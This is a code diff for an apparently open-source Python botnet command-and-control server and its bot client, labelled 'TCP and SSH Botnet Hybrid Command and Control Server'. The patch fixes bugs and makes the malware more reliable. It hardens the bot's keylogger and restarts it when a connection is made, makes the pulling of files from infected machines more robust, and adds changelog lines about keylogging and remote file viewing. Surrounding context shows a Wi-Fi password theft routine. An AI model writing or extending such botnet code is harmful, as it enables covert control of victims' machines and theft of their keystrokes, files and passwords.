@@ -203,7 +203,7 @@ class Botnet:
         except Exception as e:
             self.logo()
             print("[+] The Server cannot be started! Check the logs for more info.")
-            self.log(f"[(ERROR)]: Unable to bind IP and Port due to: {e}")
+            self.log(f"\n[(ERROR)]: Unable to bind IP and Port due to: {e}")
             sys.exit()
         self.adminconfig = threading.Thread(target=self.configure_adminfile)
         self.adminconfig.start()
@@ -279,14 +279,14 @@ class Botnet:
     def log_logo(self):
         """Logo of this script."""
         logo = """
-  _____             _     _ _   _      _         ______ __ 
- / ____|           (_)   | | \ | |    | |       |____  /_ |
-| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / / | |
- \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // /  | |
- ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // /   | |
-|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_)  |_|
-           | |                                             
-           |_|                                                                                                                                                       
+  _____             _     _ _   _      _         ______ ___  
+ / ____|           (_)   | | \ | |    | |       |____  |__ \ 
+| (___   __ _ _   _ _  __| |  \| | ___| |_  __   __ / /   ) |
+ \___ \ / _` | | | | |/ _` | . ` |/ _ \ __| \ \ / // /   / / 
+ ____) | (_| | |_| | | (_| | |\  |  __/ |_   \ V // /   / /_ 
+|_____/ \__, |\__,_|_|\__,_|_| \_|\___|\__|   \_//_(_) |____|
+           | |                                               
+           |_|                                                                                                                                           
 TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
         return logo
     def logo(self):
@@ -437,8 +437,16 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             self.serverlog.write(contents)
             self.serverlog.write(msg)
             self.serverlog.close()
-        except:
+        except FileNotFoundError:
             self.serverlog = open(self.logfile, "w")
+            self.serverlog.write(msg)
+            self.serverlog.close()
+        except:
+            self.serverlog = open(self.logfile, 'rb')
+            contents = self.serverlog.read()
+            self.serverlog.close()
+            self.serverlog = open(self.logfile, 'wb')
+            self.serverlog.write(contents)
             self.serverlog.write(msg)
             self.serverlog.close()
     def wrap_item(self, word,size):
@@ -500,6 +508,7 @@ ________________________________________________________
                     try:
                         msg = msg.decode()
                     except Exception as e:
+                        msg = str(msg)
                         self.log(f"\n[(ERROR)]: {str(e)}")
                 if not isbot:
                     if msg == "!CLIENTLOG":
@@ -569,7 +578,6 @@ ________________________________________________________
                                 main_msg = main_msg + " " + i
                             main_msg = main_msg.strip()
                             logthis = f"[({hostname})]: {main_msg}"
-                            self.log(logthis)
                             if self.displaykeys:
                                 print(logthis)
                     if admin:
@@ -680,8 +688,11 @@ ________________________________________________________
                     pass
                 else:
                     if self.savefile:
-                        if msg.decode() == "finished":
-                            savefile = False
+                        try:
+                            if msg.decode() == "finished":
+                                savefile = False
+                        except:
+                            pass
                         filenames = f"{number}{self.botfile}"
                         file_created = False
                         try:
@@ -726,7 +737,7 @@ ________________________________________________________
                             except Exception as e:
                                 self.log(f"\n[(ERROR)]: Unable to send msg to: {adminconn}.")
             except Exception as e:
-                if "a bytes-like object is required, not 'str'" in str(e) or "An operation was attempted on something that is not a socket" in str(e):
+                if "a bytes-like object is required, not 'str'" in str(e) or "An operation was attempted on something that is not a socket" in str(e) or "startswith first arg must be bytes or a tuple of bytes, not str" in str(e):
                     self.log(f"\n[(ERROR)]: Ignoring Error {e} in {hostname}")
                 else:
                     self.log(f"\n[(ERROR)]: {hostname} seems defective(Error: {e}).\n[(CLOSECONN)]: Closing connection....")
@@ -1045,6 +1056,8 @@ ________________________________________________________
 [+] - Added '!kick' and '!togglelisten'
 [+] - Added Keylogging to the bots.
 [+] - Added display message when there is an error with binding the server.
+[+] - Fixed bug that kicks bots when wanting to view content from a file remotely.
+[+] - Improved Logging Function.
                     """)
                 if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip() or "!togglelisten" in self.instruction.strip():
                     pass
@@ -4581,8 +4594,11 @@ class Bot:
     def on_release(self, key):
         pass
     def start_logging(self):
-        with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
-            listener.join()
+        try:
+            with Listener(on_press=self.on_press, on_release=self.on_release) as listener:
+                listener.join()
+        except:
+            pass
     def obtainwifipass(self):
         if sys.platform == "darwin":
             self.send("This bot is on a Apple-based product. Unable to get wifi passwords!")
@@ -4754,12 +4770,12 @@ OS:       {sys.platform}
                         self.send("!CLIENTLOG".encode())
                         time.sleep(1)
                         connected = True
-                        try:
-                            logger = threading.Thread(target=self.start_logging)
-                            logger.start()
-                        except:
-                            pass
                         break
+                    except:
+                        pass
+                    try:
+                        logger = threading.Thread(target=self.start_logging)
+                        logger.start()
                     except:
                         pass
 
@@ -5221,6 +5237,10 @@ class Web_Interface:
         conn.send('Content-Type: text/html\n'.encode())
         conn.send('\n'.encode())
         conn.send(self.packet.encode())
+        if sys.platform == "win32":
+            pass
+        else:
+            conn.close()
 """Clears CMD Output."""
 if sys.platform == "win32":
     os.system("cls")
